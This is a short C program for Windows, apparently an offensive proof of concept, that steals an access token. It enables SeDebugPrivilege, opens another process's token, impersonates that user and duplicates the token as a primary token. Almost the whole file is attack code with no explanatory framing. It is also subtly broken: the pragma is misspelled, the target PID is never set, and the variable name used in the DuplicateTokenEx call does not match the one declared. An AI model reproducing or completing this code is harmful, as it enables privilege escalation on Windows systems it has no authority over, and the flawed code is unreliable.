#include <stdio.h> 
#include <windows.h> 

#pragma commment(lib, "advapi32.lib")


void EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) { 
    
    TOKEN_PRIVILEGES tp; 
    LUID luid; 

    
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {

        printf("LookupPrivilegeValue() Failed!!"); 
        printf("Error Code: %d", GetLastError());
        exit(-1); 
    }

    tp.PrivilegeCount = 1; 
    tp.Privileges[0].Luid = luid; 

    if (bEnablePrivilege) {

        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {

        printf("AdjustTokenPrivleges() Failed!!!!"); 

    }

    printf("Privileges Enabled!!!!!!!!!!!!!!!\n");

}




int main() {

    int rep_pid; 
    HANDLE TokenH = NULL; 
    HANDLE DupliToken = NULL; 

    STARTUPINFO startup; 
    PROCESS_INFORMATION pI; 

    ZeroMemory(&startup, sizeof(STARTUPINFO)); 
    ZeroMemory(&pI, sizeof(PROCESS_INFORMATION));

    startup.cb = sizeof(STARTUPINFO); 


    HANDLE CurrentToken = NULL; 
    BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentToken);

    if(!getCurrentToken) {

        printf("Not able to retrieve current process Token!!\n"); 
        printf("Error code: %d\n", GetLastError()); 

    }

    EnablePrivileges(CurrentToken, SE_DEBUG_NAME, TRUE);

    HANDLE Rproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, rep_pid); 

    if(!Rproc) { 

        printf("Openprocess() Failed!!!\n"); 
        printf("Error Code: %d\n", GetLastError());

    }


    BOOL rToken = OpenProcessToken(Rproc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenH); 

    if(!rToken) {

        printf("OpenProcessToken() FAILED!!!!!!\n"); 
        printf("Error Code: %d\n", GetLastError());

    }

    BOOL impersonateUser = ImpersonateLoggedOnUser(TokenH); 

    if(!impersonateUser) {
        
        printf("ImpersonateLoggedOnUser() FAILED!!!!!\n");
        printf("Error Code: %d\n", GetLastError());

    }


    if(!DuplicateTokenEx(TokenH, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateToken)) {

        printf("DuplicateTokenEx() Failed!!!!!!!\n");
        printf("Error Code: %d\n", GetLastError());
    }

    return 0;

}



